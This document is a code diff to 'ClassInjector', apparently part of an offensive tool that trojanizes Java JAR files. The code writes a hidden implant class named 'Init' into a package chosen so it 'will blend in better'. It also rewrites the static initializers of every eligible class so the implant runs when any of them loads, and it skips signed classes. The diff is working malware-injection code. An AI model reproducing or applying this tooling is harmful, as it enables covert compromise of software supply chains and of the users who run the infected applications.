@@ -11,13 +11,12 @@ import java.nio.ByteOrder;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.util.Arrays;
-import java.util.HashMap;
-import java.util.Map;
 import java.util.jar.JarEntry;
 
 import static org.example.injector.Helpers.setStaticFlagForMethod;
 
 public class ClassInjector {
+    final static String IMPLANT_CLASS_NAME = "Init";
     private final Class<?> implantClass;
 
     ClassInjector(Class<?> implantClass) {
@@ -54,7 +53,7 @@ public class ClassInjector {
     }
 
     public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
-        Map<String, ClassFile> infectedPackages = new HashMap<>();
+        ClassFile implantedClass = null;
         boolean foundSignedClasses = false;
 
         try (JarFileFiddler fiddler = JarFileFiddler.open(targetJarFilePath, outputJar)) {
@@ -68,22 +67,40 @@ public class ClassInjector {
                     entry.passOn();
                     continue;
                 }
+                if (entry.getName().equals(IMPLANT_CLASS_NAME + ".class")) {
+                    System.out.println("[-] WARNING: It looks like this JAR may already be infected. Proceeding anyway.");
+                    entry.passOn();
+                    continue;
+                }
 
                 try (DataInputStream in = new DataInputStream(entry.getContent())) {
                     ClassFile currentlyProcessing = new ClassFile(in);
 
                     String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
-                    if (!infectedPackages.containsKey(targetPackageName)) {
+                    if (implantedClass == null) {
+                        /*
+                         * Since there are other classes in this directory, the implant will blend in better here.
+                         * Any directory will do and only one occurrence of the implant class in the JAR is enough.
+                         */
                         ClassFile implant = ImplantReader.findAndReadClassFile(implantClass);
-                        deepRenameClass(implant, targetPackageName, "Init");
+                        deepRenameClass(implant, targetPackageName, IMPLANT_CLASS_NAME);
                         JarEntry newJarEntry = convertToJarEntry(implant);
                         implant.write(fiddler.addNewEntry(newJarEntry));
-                        infectedPackages.put(targetPackageName, implant);
                         System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
+
+                        implantedClass = implant;
                     }
 
-                    ClassFile implantedClass = infectedPackages.get(targetPackageName);
-                    modifyClinit(entry, currentlyProcessing, implantedClass);
+                    /*
+                     * As the class is now planted into the JAR, it must be referred to somehow (by anything running)
+                     * in order to be loaded. Modify the class initializer (static block) of all eligible classes to
+                     * explicitly use the implant class. The implant will thus be called upon once per class that is
+                     * infected. Remember that a class initializer will run only once per class.
+                     * Several classes are infected because it's difficult to know what specific class will be used
+                     * by an app.
+                     */
+                    modifyClinit(currentlyProcessing, implantedClass);
+                    currentlyProcessing.write(entry.addOnly());
                     System.out.println("[+] Modified class initializer for '" + currentlyProcessing.getName() + "'.");
                 } catch (ClassNotFoundException e) {
                     throw new RuntimeException(e);
@@ -94,13 +111,12 @@ public class ClassInjector {
                 System.out.println("[-] Found signed classes. These were not considered for infection.");
             }
 
-            System.out.println("[+] Infected " + infectedPackages.size() + " package paths in JAR file.");
-            return !infectedPackages.isEmpty();
+            return implantedClass != null;
         }
     }
 
 
-    private static void modifyClinit(JarFileFiddler.WrappedJarEntry jarEntry, ClassFile targetClass, ClassFile implantClass) throws IOException {
+    private static void modifyClinit(ClassFile targetClass, ClassFile implantClass) {
         MethodInfo implantInitMethod = implantClass.getMethod("implant");
         if (implantInitMethod == null) {
             throw new UnsupportedOperationException("Implant class does not have a 'public static implant()' function.");
@@ -118,7 +134,7 @@ public class ClassInjector {
             try {
                 targetClass.addMethod(currentClinit);
             } catch (DuplicateMemberException e) {
-                throw new RuntimeException("Internal error: clinit already exist despite not existing", e);
+                throw new RuntimeException("Internal error: <clinit> already exist despite not existing", e);
             }
         }
 
@@ -132,9 +148,6 @@ public class ClassInjector {
         concatenatedCode.put(currentClinitCodeAttr.getCode());
         CodeAttribute newCodeAttribute = new CodeAttribute(targetClass.getConstPool(), currentClinitCodeAttr.getMaxStack(), currentClinitCodeAttr.getMaxLocals(), concatenatedCode.array(), currentClinitCodeAttr.getExceptionTable());
         currentClinit.setCodeAttribute(newCodeAttribute);
-
-        // Modify the class file
-        targetClass.write(jarEntry.addOnly());
     }
 
     private static void deepRenameClass(ClassFile classFile, String newPackageName, String newClassName) {
